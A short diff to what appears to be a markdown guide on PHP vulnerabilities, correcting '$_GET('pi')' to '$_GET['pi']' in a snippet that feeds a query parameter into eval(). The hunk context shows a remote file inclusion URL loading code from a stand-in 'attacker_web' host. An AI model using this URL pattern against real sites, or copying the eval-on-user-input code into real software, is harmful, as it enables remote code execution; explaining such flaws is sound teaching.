@@ -18,7 +18,7 @@ http://something/index.php?page=http://attacker_web/evilcode.php
 
 ```php
 $your_var = "your_pi";
-$p = $_GET('pi');
+$p = $_GET['pi'];
 eval("\$your_var = \$p;");
 ```
 
